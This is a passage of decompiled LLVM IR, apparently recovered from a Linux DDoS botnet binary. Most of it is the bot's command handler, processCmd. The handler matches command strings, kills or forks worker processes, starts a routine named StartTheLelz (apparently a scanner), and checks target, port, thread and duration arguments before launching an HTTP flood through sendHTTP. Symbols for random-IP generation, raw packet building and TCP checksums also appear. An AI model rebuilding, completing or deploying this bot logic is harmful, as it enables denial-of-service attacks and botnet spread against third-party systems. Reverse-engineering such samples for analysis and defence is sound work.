  uselistorder i32 %v1_804ba4e, { 1, 0 }
  uselistorder i1 %v0_804ba35, { 1, 0 }
  uselistorder i32 %v6_804ba33, { 1, 0 }
  uselistorder i32 %v4_804ba15, { 0, 2, 1, 4, 3, 6, 5, 8, 7, 9, 10 }
  uselistorder i32 %stack_var_-160.130, { 3, 2, 1, 0 }
  uselistorder i8* %stack_var_-156.131, { 3, 2, 1, 0 }
  uselistorder i8* %v3_804bb95, { 5, 4, 3, 2, 0, 1 }
  uselistorder i8* %v2_804bb82, { 4, 9, 3, 8, 2, 7, 1, 6, 0, 5 }
  uselistorder i32 %v1_804b9ee, { 1, 0 }
  uselistorder i32 %v1_804b9e2, { 1, 0 }
  uselistorder i32 %v1_804b9d6, { 1, 0 }
  uselistorder i32 %v1_804b9ca, { 1, 0 }
  uselistorder i32 %v1_804b9be, { 1, 0 }
  uselistorder i8* %v2_804b9bb, { 4, 5, 3, 6, 2, 7, 1, 8, 0, 9 }
  uselistorder i1 %v0_804b9a5, { 1, 0 }
  uselistorder i32 %v6_804b9a3, { 1, 0 }
  uselistorder i32 %v1_804b957, { 1, 0 }
  uselistorder i32 %v0_804b939, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 %v1_804b914, { 5, 6, 7, 8, 9, 10, 0, 1, 2, 3, 4, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder i32 %v2_804b8fc, { 14, 13, 12, 11, 10, 9, 8, 26, 25, 24, 7, 6, 23, 5, 4, 22, 21, 20, 19, 27, 18, 17, 16, 15, 3, 2, 1, 0 }
  uselistorder i32 %v2_804b8f1, { 1, 0, 2 }
  uselistorder i32 %v2_804b8d2, { 1, 0 }
  uselistorder i32 %v1_804b7fb, { 1, 0 }
  uselistorder i32* %stack_var_-172, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32* %stack_var_-60, { 1, 0, 3, 2 }
  uselistorder i32* %stack_var_-56, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-64, { 2, 1, 0, 4, 3 }
  uselistorder i8** %stack_var_-20, { 3, 1, 2, 0 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder i1* %cf.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 33, 16, 17, 18, 19, 20, 22, 21, 23, 25, 24, 26, 28, 27, 29, 31, 30, 32, 64, 65, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__libc_sendto, { 2, 1, 0 }
  uselistorder i32 -24, { 0, 1, 5, 4, 3, 2, 6, 7, 8, 9 }
  uselistorder i32 -20, { 0, 1, 5, 4, 3, 2, 6, 7, 8, 9 }
  uselistorder i32 ()* @tcpcsum, { 1, 0 }
  uselistorder i32 ()* @makeIPPacket, { 1, 0 }
  uselistorder i32 ()* @htonl, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32)* @GetRandomIP, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__GI_setsockopt, { 2, 1, 0 }
  uselistorder i32 (i32)* @rand_cmwc, { 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg7, { 0, 2, 1, 3 }
  uselistorder i32 %arg6, { 2, 1, 0 }
  uselistorder i8* %arg5, { 1, 0 }
  uselistorder i32 %arg4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804bd51, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_804bc74, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804bc0e, { 1, 0 }
  uselistorder label %dec_label_pc_804bba6, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_804ba15, { 1, 0 }
  uselistorder label %dec_label_pc_804b8d9, { 1, 0 }
  uselistorder label %bb103, { 1, 0 }
  uselistorder label %dec_label_pc_804b810, { 1, 0 }
}

define i32 @processCmd() local_unnamed_addr {
entry:
  %cf.global-to-local = alloca i1, align 1
  %edx.global-to-local = alloca i32, align 4
  %tmp115 = call i32 @__decompiler_undefined_function_0()
  %tmp134 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-300 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804bd5f = load i32, i32* @edi, align 4
  %v0_804bd60 = load i32, i32* @esi, align 4
  %v0_804bd61 = load i32, i32* @ebx, align 4
  store i32 %v0_804bd61, i32* %stack_var_-16, align 4
  %v5_804bd62 = icmp ult i32* %stack_var_-16, inttoptr (i32 268 to i32*)
  store i1 %v5_804bd62, i1* %cf.global-to-local, align 1
  %v15_804bd62 = ptrtoint i32* %stack_var_-284 to i32
  %v1_804bd6b = inttoptr i32 %tmp134 to i32*
  %v2_804bd6b = load i32, i32* %v1_804bd6b, align 4
  store i1 false, i1* @df, align 1
  %v4_804bd88 = inttoptr i32 %v2_804bd6b to i8*
  store i32 %v2_804bd6b, i32* @esi, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_8056160.19 to i32), i32* @edi, align 4
  %v7_804bd9a = call i32 @_strncmp(i8* %v4_804bd88, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8056160.19, i32 0, i32 0), i32 5)
  %v8_804bd9a = urem i32 %v7_804bd9a, 2
  %v9_804bd9a = icmp eq i32 %v8_804bd9a, 0
  %v0_804bd9c = load i1, i1* %cf.global-to-local, align 1
  %v2_804bd9c = or i1 %v0_804bd9c, %v9_804bd9a
  %v3_804bd9c = zext i1 %v2_804bd9c to i32
  %v4_804bd9c = load i32, i32* @edx, align 4
  %v5_804bd9c = and i32 %v4_804bd9c, -256
  %v6_804bd9c = or i32 %v3_804bd9c, %v5_804bd9c
  %v7_804bd9c = xor i32 %v6_804bd9c, 1
  store i32 %v7_804bd9c, i32* %edx.global-to-local, align 4
  %v1_804bda4 = trunc i32 %v7_804bd9c to i8
  %v3_804bda4 = zext i1 %v0_804bd9c to i8
  %v15_804bda4 = icmp eq i8 %v1_804bda4, %v3_804bda4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804bdad = icmp eq i1 %v15_804bda4, false
  br i1 %v1_804bdad, label %dec_label_pc_804bdca, label %dec_label_pc_804bdaf

dec_label_pc_804bdaf:                             ; preds = %entry
  %v0_804bdaf = load i32, i32* @global_var_805a160.18, align 32
  %v0_804bdb4 = load i32, i32* @esp, align 4
  %v5_804bdb4 = icmp ult i32 %v0_804bdb4, 8
  store i1 %v5_804bdb4, i1* %cf.global-to-local, align 1
  store i32 %v0_804bdaf, i32* %stack_var_-300, align 4
  %v2_804bdbd = call i32 @Rootsprintf(i32 %v0_804bdaf, i32 ptrtoint ([6 x i8]* @global_var_80564d9.150 to i32))
  %v0_804bdc2 = load i32, i32* @esp, align 4
  %v2_804bdc2 = icmp ugt i32 %v0_804bdc2, -17
  store i1 %v2_804bdc2, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804c8cb

dec_label_pc_804bdca:                             ; preds = %entry
  %v2_804bdcd = load i32, i32* %v1_804bd6b, align 4
  %v4_804bdea = inttoptr i32 %v2_804bdcd to i8*
  %v7_804bdfc = call i32 @_strncmp(i8* %v4_804bdea, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80564df.151, i32 0, i32 0), i32 6)
  %v8_804bdfc = urem i32 %v7_804bdfc, 2
  %v9_804bdfc = icmp eq i32 %v8_804bdfc, 0
  %v0_804bdfe = load i1, i1* %cf.global-to-local, align 1
  %v2_804bdfe = or i1 %v0_804bdfe, %v9_804bdfc
  %v3_804bdfe = zext i1 %v2_804bdfe to i32
  %v4_804bdfe = load i32, i32* %edx.global-to-local, align 4
  %v5_804bdfe = and i32 %v4_804bdfe, -256
  %v6_804bdfe = or i32 %v3_804bdfe, %v5_804bdfe
  %v7_804bdfe = xor i32 %v6_804bdfe, 1
  store i32 %v7_804bdfe, i32* %edx.global-to-local, align 4
  %v1_804be06 = trunc i32 %v7_804bdfe to i8
  %v3_804be06 = zext i1 %v0_804bdfe to i8
  %v15_804be06 = icmp eq i8 %v1_804be06, %v3_804be06
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804be0f = icmp eq i1 %v15_804be06, false
  br i1 %v1_804be0f, label %dec_label_pc_804bf44, label %dec_label_pc_804be15

dec_label_pc_804be15:                             ; preds = %dec_label_pc_804bdca
  %v1_804be18 = add i32 %tmp134, 4
  %v5_804be18 = icmp ugt i32 %tmp134, -5
  store i1 %v5_804be18, i1* %cf.global-to-local, align 1
  %v1_804be1b = inttoptr i32 %v1_804be18 to i32*
  %v2_804be1b = load i32, i32* %v1_804be1b, align 4
  store i1 false, i1* @df, align 1
  %v4_804be38 = inttoptr i32 %v2_804be1b to i8*
  store i32 %v2_804be1b, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_80564e5.152 to i32), i32* @edi, align 4
  %v7_804be4a = call i32 @_strncmp(i8* %v4_804be38, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80564e5.152, i32 0, i32 0), i32 4)
  %v8_804be4a = urem i32 %v7_804be4a, 2
  %v9_804be4a = icmp eq i32 %v8_804be4a, 0
  %v0_804be4c = load i1, i1* %cf.global-to-local, align 1
  %v2_804be4c = or i1 %v0_804be4c, %v9_804be4a
  %v3_804be4c = zext i1 %v2_804be4c to i32
  %v4_804be4c = load i32, i32* %edx.global-to-local, align 4
  %v5_804be4c = and i32 %v4_804be4c, -256
  %v6_804be4c = or i32 %v3_804be4c, %v5_804be4c
  %v7_804be4c = xor i32 %v6_804be4c, 1
  store i32 %v7_804be4c, i32* @edx, align 4
  %v1_804be54 = trunc i32 %v7_804be4c to i8
  %v3_804be54 = zext i1 %v0_804be4c to i8
  %v15_804be54 = icmp eq i8 %v1_804be54, %v3_804be54
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804be5d = icmp eq i1 %v15_804be54, false
  br i1 %v1_804be5d, label %dec_label_pc_804be9f, label %dec_label_pc_804be5f

dec_label_pc_804be5f:                             ; preds = %dec_label_pc_804be15
  %v0_804be5f = load i32, i32* @global_var_80603f0.153, align 16
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804be64 = icmp eq i32 %v0_804be5f, 0
  br i1 %v1_804be64, label %dec_label_pc_804c8cb, label %dec_label_pc_804be6c

dec_label_pc_804be6c:                             ; preds = %dec_label_pc_804be5f
  %v0_804be71 = load i32, i32* @esp, align 4
  %v5_804be71 = icmp ult i32 %v0_804be71, 8
  store i1 %v5_804be71, i1* %cf.global-to-local, align 1
  store i32 %v0_804be5f, i32* %stack_var_-300, align 4
  %v2_804be77 = call i32 @kill(i32 %v0_804be5f, i32 9)
  %v0_804be7f = load i32, i32* @global_var_805a160.18, align 32
  %v5_804be84 = icmp ult i32* %stack_var_-284, inttoptr (i32 8 to i32*)
  store i1 %v5_804be84, i1* %cf.global-to-local, align 1
  store i32 %v0_804be7f, i32* %stack_var_-300, align 4
  %v2_804be8d = call i32 @Rootsprintf(i32 %v0_804be7f, i32 ptrtoint ([14 x i8]* @global_var_80564e9.154 to i32))
  %v0_804be92 = load i32, i32* @esp, align 4
  %v2_804be92 = icmp ugt i32 %v0_804be92, -17
  store i1 %v2_804be92, i1* %cf.global-to-local, align 1
  store i32 0, i32* @global_var_80603f0.153, align 16
  br label %dec_label_pc_804be9f

dec_label_pc_804be9f:                             ; preds = %dec_label_pc_804be15, %dec_label_pc_804be6c
  store i1 %v5_804be18, i1* %cf.global-to-local, align 1
  %v2_804bea5 = load i32, i32* %v1_804be1b, align 4
  store i1 false, i1* @df, align 1
  %v4_804bec2 = inttoptr i32 %v2_804bea5 to i8*
  %v7_804bed4 = call i32 @_strncmp(i8* %v4_804bec2, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_80564f7.155, i32 0, i32 0), i32 3)
  %v8_804bed4 = urem i32 %v7_804bed4, 2
  %v9_804bed4 = icmp eq i32 %v8_804bed4, 0
  %v0_804bed6 = load i1, i1* %cf.global-to-local, align 1
  %v2_804bed6 = or i1 %v0_804bed6, %v9_804bed4
  %v3_804bed6 = zext i1 %v2_804bed6 to i32
  %v4_804bed6 = load i32, i32* @edx, align 4
  %v5_804bed6 = and i32 %v4_804bed6, -256
  %v6_804bed6 = or i32 %v3_804bed6, %v5_804bed6
  %v7_804bed6 = xor i32 %v6_804bed6, 1
  store i32 %v7_804bed6, i32* %edx.global-to-local, align 4
  %v1_804bede = trunc i32 %v7_804bed6 to i8
  %v3_804bede = zext i1 %v0_804bed6 to i8
  %v15_804bede = icmp eq i8 %v1_804bede, %v3_804bede
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804bee7 = icmp eq i1 %v15_804bede, false
  br i1 %v1_804bee7, label %dec_label_pc_804bf44, label %dec_label_pc_804bee9

dec_label_pc_804bee9:                             ; preds = %dec_label_pc_804be9f
  %v0_804bee9 = load i32, i32* @global_var_80603f0.153, align 16
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804beee = icmp eq i32 %v0_804bee9, 0
  %v1_804bef0 = icmp eq i1 %v1_804beee, false
  br i1 %v1_804bef0, label %dec_label_pc_804c8cb, label %dec_label_pc_804bef6

dec_label_pc_804bef6:                             ; preds = %dec_label_pc_804bee9
  %v1_804bef6 = call i32 @__libc_fork(i32 3)
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804bf0c = icmp eq i32 %v1_804bef6, 0
  br i1 %v4_804bf0c, label %dec_label_pc_804bf29, label %dec_label_pc_804bf12

dec_label_pc_804bf12:                             ; preds = %dec_label_pc_804bef6
  store i32 %v1_804bef6, i32* @global_var_80603f0.153, align 16
  br label %dec_label_pc_804c8cb

dec_label_pc_804bf29:                             ; preds = %dec_label_pc_804bef6
  %v0_804bf29 = load i32, i32* @esp, align 4
  %v5_804bf29 = icmp ult i32 %v0_804bf29, 8
  store i1 %v5_804bf29, i1* %cf.global-to-local, align 1
  store i32 10, i32* %stack_var_-300, align 4
  %v2_804bf32 = call i32 @StartTheLelz(i32 10, i32 1000)
  %v5_804bf3a = icmp ult i32* %stack_var_-284, inttoptr (i32 12 to i32*)
  store i1 %v5_804bf3a, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-300, align 4
  %v1_804bf3f = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804bf44:                             ; preds = %dec_label_pc_804be9f, %dec_label_pc_804bdca
  %v2_804bf47 = load i32, i32* %v1_804bd6b, align 4
  store i1 false, i1* @df, align 1
  %v4_804bf64 = inttoptr i32 %v2_804bf47 to i8*
  store i32 %v2_804bf47, i32* @esi, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_80564fa.156 to i32), i32* @edi, align 4
  %v7_804bf76 = call i32 @_strncmp(i8* %v4_804bf64, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_80564fa.156, i32 0, i32 0), i32 5)
  %v8_804bf76 = urem i32 %v7_804bf76, 2
  %v9_804bf76 = icmp eq i32 %v8_804bf76, 0
  %v0_804bf78 = load i1, i1* %cf.global-to-local, align 1
  %v2_804bf78 = or i1 %v0_804bf78, %v9_804bf76
  %v3_804bf78 = zext i1 %v2_804bf78 to i32
  %v4_804bf78 = load i32, i32* %edx.global-to-local, align 4
  %v5_804bf78 = and i32 %v4_804bf78, -256
  %v6_804bf78 = or i32 %v3_804bf78, %v5_804bf78
  %v7_804bf78 = xor i32 %v6_804bf78, 1
  store i32 %v7_804bf78, i32* @edx, align 4
  %v1_804bf80 = trunc i32 %v7_804bf78 to i8
  %v3_804bf80 = zext i1 %v0_804bf78 to i8
  %v4_804bf80 = sub nsw i8 %v1_804bf80, %v3_804bf80
  %v15_804bf80 = icmp eq i8 %v4_804bf80, 0
  store i1 false, i1* @cf, align 1
  %v1_804bf89 = icmp eq i1 %v15_804bf80, false
  br i1 %v1_804bf89, label %dec_label_pc_804c0b5, label %dec_label_pc_804bf8f

dec_label_pc_804bf8f:                             ; preds = %dec_label_pc_804bf44
  %v2_804bf84 = sext i8 %v4_804bf80 to i32
  %v9_804bf8f = icmp ult i32 %tmp115, 5
  store i1 %v9_804bf8f, i1* %cf.global-to-local, align 1
  %v7_804bf93 = icmp sgt i32 %tmp115, 5
  br i1 %v7_804bf93, label %dec_label_pc_804bf99, label %dec_label_pc_804c8cb

dec_label_pc_804bf99:                             ; preds = %dec_label_pc_804bf8f
  %v1_804bf9c = add i32 %tmp134, 12
  %v1_804bf9f = inttoptr i32 %v1_804bf9c to i32*
  %v2_804bf9f = load i32, i32* %v1_804bf9f, align 4
  %v0_804bfa1 = load i32, i32* @esp, align 4
  %v5_804bfa1 = icmp ult i32 %v0_804bfa1, 12
  store i1 %v5_804bfa1, i1* %cf.global-to-local, align 1
  %v1_804bfa5 = call i32 @atol(i32 %v2_804bf9f)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp153 = icmp slt i32 %v1_804bfa5, 1
  br i1 %tmp153, label %dec_label_pc_804c8cb, label %dec_label_pc_804bfb5

dec_label_pc_804bfb5:                             ; preds = %dec_label_pc_804bf99
  %v1_804bfb8 = add i32 %tmp134, 20
  %v1_804bfbb = inttoptr i32 %v1_804bfb8 to i32*
  %v2_804bfbb = load i32, i32* %v1_804bfbb, align 4
  %v5_804bfbd = icmp ult i32* %stack_var_-300, inttoptr (i32 12 to i32*)
  store i1 %v5_804bfbd, i1* %cf.global-to-local, align 1
  %v1_804bfc1 = call i32 @atol(i32 %v2_804bfbb)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp154 = icmp slt i32 %v1_804bfc1, 1
  %tmp155 = icmp eq i1 %tmp154, false
  br i1 %tmp155, label %dec_label_pc_804bfd2, label %dec_label_pc_804c8cb

dec_label_pc_804bfd2:                             ; preds = %dec_label_pc_804bfb5
  %v0_804bfd2 = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804bfd7 = icmp eq i32 %v0_804bfd2, 0
  %v1_804bfd9 = icmp eq i1 %v1_804bfd7, false
  br i1 %v1_804bfd9, label %dec_label_pc_804c8cb, label %dec_label_pc_804bfdf

dec_label_pc_804bfdf:                             ; preds = %dec_label_pc_804bfd2
  %v2_804bfe5 = load i32, i32* %v1_804bfbb, align 4
  %v0_804bfe7 = load i32, i32* @esp, align 4
  %v5_804bfe7 = icmp ult i32 %v0_804bfe7, 12
  store i1 %v5_804bfe7, i1* %cf.global-to-local, align 1
  %v1_804bfeb = call i32 @atol(i32 %v2_804bfe5)
  store i32 %v1_804bfeb, i32* @esi, align 4
  %v2_804bffb = load i32, i32* %v1_804bf9f, align 4
  store i1 %v5_804bfbd, i1* %cf.global-to-local, align 1
  %v1_804c001 = call i32 @atol(i32 %v2_804bffb)
  store i32 %v1_804c001, i32* %edx.global-to-local, align 4
  %v1_804c00e = add i32 %tmp134, 8
  %v1_804c011 = inttoptr i32 %v1_804c00e to i32*
  %v1_804c016 = add i32 %tmp134, 4
  %v1_804c019 = inttoptr i32 %v1_804c016 to i32*
  %v0_804c01b = load i32, i32* @global_var_805a160.18, align 32
  store i32 %v0_804c01b, i32* @ebx, align 4
  %v5_804c021 = icmp ult i32* %stack_var_-300, inttoptr (i32 8 to i32*)
  store i1 %v5_804c021, i1* %cf.global-to-local, align 1
  %v3_804c02e = call i32 @Rootsprintf(i32 %v0_804c01b, i32 ptrtoint ([38 x i8]* @global_var_8056500.157 to i32))
  %v1_804c039 = add i32 %tmp134, 24
  %v1_804c03c = inttoptr i32 %v1_804c039 to i32*
  %v2_804c03c = load i32, i32* %v1_804c03c, align 4
  store i1 %v5_804bfbd, i1* %cf.global-to-local, align 1
  %v1_804c042 = call i32 @atol(i32 %v2_804c03c)
  store i32 %v1_804c042, i32* @ebx, align 4
  %v2_804c052 = load i32, i32* %v1_804bfbb, align 4
  store i1 %v5_804bfbd, i1* %cf.global-to-local, align 1
  %v1_804c058 = call i32 @atol(i32 %v2_804c052)
  store i32 %v1_804c058, i32* @esi, align 4
  %v1_804c065 = add i32 %tmp134, 16
  %v1_804c068 = inttoptr i32 %v1_804c065 to i32*
  %v2_804c068 = load i32, i32* %v1_804c068, align 4
  store i32 %v2_804c068, i32* @edi, align 4
  %v2_804c072 = load i32, i32* %v1_804bf9f, align 4
  store i1 %v5_804bfbd, i1* %cf.global-to-local, align 1
  %v1_804c078 = call i32 @atol(i32 %v2_804c072)
  %v2_804c08e = load i32, i32* %v1_804c011, align 4
  store i32 %v2_804c08e, i32* %edx.global-to-local, align 4
  %v2_804c098 = load i32, i32* %v1_804c019, align 4
  store i1 %v5_804c021, i1* %cf.global-to-local, align 1
  %v0_804c09d = load i32, i32* @ebx, align 4
  %v0_804c09e = load i32, i32* @esi, align 4
  %v0_804c09f = load i32, i32* @edi, align 4
  %v7_804c0a3 = trunc i32 %v1_804c078 to i16
  %v8_804c0a3 = call i32 @sendHTTP(i32 %v2_804c098, i32 %v2_804c08e, i16 %v7_804c0a3, i32 %v0_804c09f, i32 %v0_804c09e, i32 %v0_804c09d)
  store i32 %v8_804c0a3, i32* @eax, align 4
  store i1 %v5_804bfbd, i1* %cf.global-to-local, align 1
  %v1_804c0b0 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_804c0b5

dec_label_pc_804c0b5:                             ; preds = %dec_label_pc_804bf44, %dec_label_pc_804bfdf
  %v2_804c0b8 = load i32, i32* %v1_804bd6b, align 4
  store i1 false, i1* @df, align 1
  %v4_804c0d5 = inttoptr i32 %v2_804c0b8 to i8*
  store i32 %v2_804c0b8, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_8056526.158 to i32), i32* @edi, align 4
  %v7_804c0e7 = call i32 @_strncmp(i8* %v4_804c0d5, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8056526.158, i32 0, i32 0), i32 4)
  %v8_804c0e7 = urem i32 %v7_804c0e7, 2
  %v9_804c0e7 = icmp eq i32 %v8_804c0e7, 0
  %v0_804c0e9 = load i1, i1* @cf, align 1
  %v2_804c0e9 = or i1 %v0_804c0e9, %v9_804c0e7
  %v3_804c0e9 = zext i1 %v2_804c0e9 to i32
  %v4_804c0e9 = load i32, i32* @edx, align 4
  %v5_804c0e9 = and i32 %v4_804c0e9, -256
  %v6_804c0e9 = or i32 %v3_804c0e9, %v5_804c0e9
  %v7_804c0e9 = xor i32 %v6_804c0e9, 1
  store i32 %v7_804c0e9, i32* %edx.global-to-local, align 4
  %v1_804c0f1 = trunc i32 %v7_804c0e9 to i8
  %v3_804c0f1 = zext i1 %v0_804c0e9 to i8
  %v15_804c0f1 = icmp eq i8 %v1_804c0f1, %v3_804c0f1
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804c0fa = icmp eq i1 %v15_804c0f1, false
  br i1 %v1_804c0fa, label %dec_label_pc_804c3c0, label %dec_label_pc_804c100

dec_label_pc_804c100:                             ; preds = %dec_label_pc_804c0b5
  %v9_804c100 = icmp ult i32 %tmp115, 5
  store i1 %v9_804c100, i1* %cf.global-to-local, align 1
  %v7_804c104 = icmp sgt i32 %tmp115, 5
  br i1 %v7_804c104, label %dec_label_pc_804c10a, label %dec_label_pc_804c100.dec_label_pc_804c1e7_crit_edge

dec_label_pc_804c100.dec_label_pc_804c1e7_crit_edge: ; preds = %dec_label_pc_804c100
  %v0_804c1ec.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804c1e7

dec_label_pc_804c10a:                             ; preds = %dec_label_pc_804c100
  %v1_804c10d = add i32 %tmp134, 12
  %v1_804c110 = inttoptr i32 %v1_804c10d to i32*
  %v2_804c110 = load i32, i32* %v1_804c110, align 4
  %v0_804c112 = load i32, i32* @esp, align 4
  %v5_804c112 = icmp ult i32 %v0_804c112, 12
  store i1 %v5_804c112, i1* %cf.global-to-local, align 1
  store i32 %v2_804c110, i32* %stack_var_-300, align 4
  %v1_804c116 = call i32 @atol(i32 %v2_804c110)
  %v5_804c11e = icmp ne i32 %v1_804c116, -1
  store i1 %v5_804c11e, i1* %cf.global-to-local, align 1
  %v10_804c11e = icmp eq i32 %v1_804c116, -1
  br i1 %v10_804c11e, label %dec_label_pc_804c1e7, label %dec_label_pc_804c127

dec_label_pc_804c127:                             ; preds = %dec_label_pc_804c10a
  %v1_804c12a = add i32 %tmp134, 8
  %v1_804c12d = inttoptr i32 %v1_804c12a to i32*
  %v2_804c12d = load i32, i32* %v1_804c12d, align 4
  %v5_804c12f = icmp ult i32* %stack_var_-284, inttoptr (i32 12 to i32*)
  store i1 %v5_804c12f, i1* %cf.global-to-local, align 1
  store i32 %v2_804c12d, i32* %stack_var_-300, align 4
  %v1_804c133 = call i32 @atol(i32 %v2_804c12d)
  %v5_804c13b = icmp ne i32 %v1_804c133, -1
  store i1 %v5_804c13b, i1* %cf.global-to-local, align 1
  %v10_804c13b = icmp eq i32 %v1_804c133, -1
  br i1 %v10_804c13b, label %dec_label_pc_804c1e7, label %dec_label_pc_804c144

dec_label_pc_804c144:                             ; preds = %dec_label_pc_804c127
  %v1_804c147 = add i32 %tmp134, 16
  %v1_804c14a = inttoptr i32 %v1_804c147 to i32*
  %v2_804c14a = load i32, i32* %v1_804c14a, align 4
  store i1 %v5_804c12f, i1* %cf.global-to-local, align 1
  store i32 %v2_804c14a, i32* %stack_var_-300, align 4
  %v1_804c150 = call i32 @atol(i32 %v2_804c14a)
  %v5_804c158 = icmp ne i32 %v1_804c150, -1
  store i1 %v5_804c158, i1* %cf.global-to-local, align 1
  %v10_804c158 = icmp eq i32 %v1_804c150, -1
  br i1 %v10_804c158, label %dec_label_pc_804c1e7, label %dec_label_pc_804c161

dec_label_pc_804c161:                             ; preds = %dec_label_pc_804c144
  %v1_804c164 = add i32 %tmp134, 20
  %v1_804c167 = inttoptr i32 %v1_804c164 to i32*
  %v2_804c167 = load i32, i32* %v1_804c167, align 4
  store i1 %v5_804c12f, i1* %cf.global-to-local, align 1
  store i32 %v2_804c167, i32* %stack_var_-300, align 4
  %v1_804c16d = call i32 @atol(i32 %v2_804c167)
  %v5_804c175 = icmp ne i32 %v1_804c16d, -1
  store i1 %v5_804c175, i1* %cf.global-to-local, align 1
  %v10_804c175 = icmp eq i32 %v1_804c16d, -1
  br i1 %v10_804c175, label %dec_label_pc_804c1e7, label %dec_label_pc_804c17a

dec_label_pc_804c17a:                             ; preds = %dec_label_pc_804c161
  %v2_804c180 = load i32, i32* %v1_804c167, align 4
  store i1 %v5_804c12f, i1* %cf.global-to-local, align 1
  store i32 %v2_804c180, i32* %stack_var_-300, align 4
  %v1_804c186 = call i32 @atol(i32 %v2_804c180)
  %v1_804c18e = add i32 %v1_804c186, -65536
  %v2_804c18e = icmp ult i32 %v1_804c186, 65536
  %v3_804c18e = sub i32 65535, %v1_804c186
  %v4_804c18e = and i32 %v3_804c18e, %v1_804c186
  %v5_804c18e = icmp slt i32 %v4_804c18e, 0
  store i1 %v2_804c18e, i1* %cf.global-to-local, align 1
  %v6_804c18e = icmp eq i32 %v1_804c18e, 0
  %v7_804c18e = icmp slt i32 %v1_804c18e, 0
  %v3_804c193 = icmp eq i1 %v7_804c18e, %v5_804c18e
  %v4_804c193 = icmp eq i1 %v6_804c18e, false
  %v5_804c193 = and i1 %v4_804c193, %v3_804c193
  br i1 %v5_804c193, label %dec_label_pc_804c1e7, label %dec_label_pc_804c195

dec_label_pc_804c195:                             ; preds = %dec_label_pc_804c17a
  %v2_804c19b = load i32, i32* %v1_804c167, align 4
  store i1 %v5_804c12f, i1* %cf.global-to-local, align 1
  store i32 %v2_804c19b, i32* %stack_var_-300, align 4
  %v1_804c1a1 = call i32 @atol(i32 %v2_804c19b)
  %v1_804c1a9 = add i32 %v1_804c1a1, -65500
  %v5_804c1a9 = icmp ult i32 %v1_804c1a1, 65500
  %v6_804c1a9 = sub i32 65499, %v1_804c1a1
  %v7_804c1a9 = and i32 %v6_804c1a9, %v1_804c1a1
  %v8_804c1a9 = icmp slt i32 %v7_804c1a9, 0
  store i1 %v5_804c1a9, i1* %cf.global-to-local, align 1
  %v9_804c1a9 = icmp eq i32 %v1_804c1a9, 0
  %v10_804c1a9 = icmp slt i32 %v1_804c1a9, 0
  %v3_804c1ae = icmp eq i1 %v10_804c1a9, %v8_804c1a9
  %v4_804c1ae = icmp eq i1 %v9_804c1a9, false
  %v5_804c1ae = and i1 %v4_804c1ae, %v3_804c1ae
  br i1 %v5_804c1ae, label %dec_label_pc_804c1e7, label %dec_label_pc_804c1b0

dec_label_pc_804c1b0:                             ; preds = %dec_label_pc_804c195
  %v2_804c1b6 = load i32, i32* %v1_804c14a, align 4
  store i1 %v5_804c12f, i1* %cf.global-to-local, align 1
  store i32 %v2_804c1b6, i32* %stack_var_-300, align 4
  %v1_804c1bc = call i32 @atol(i32 %v2_804c1b6)
  %v1_804c1c4 = add i32 %v1_804c1bc, -32
  %v2_804c1c4 = icmp ult i32 %v1_804c1bc, 32
  %v3_804c1c4 = sub i32 31, %v1_804c1bc
  %v4_804c1c4 = and i32 %v3_804c1c4, %v1_804c1bc
  %v5_804c1c4 = icmp slt i32 %v4_804c1c4, 0
  store i1 %v2_804c1c4, i1* %cf.global-to-local, align 1
  %v6_804c1c4 = icmp eq i32 %v1_804c1c4, 0
  %v7_804c1c4 = icmp slt i32 %v1_804c1c4, 0
  %v3_804c1c7 = icmp eq i1 %v7_804c1c4, %v5_804c1c4
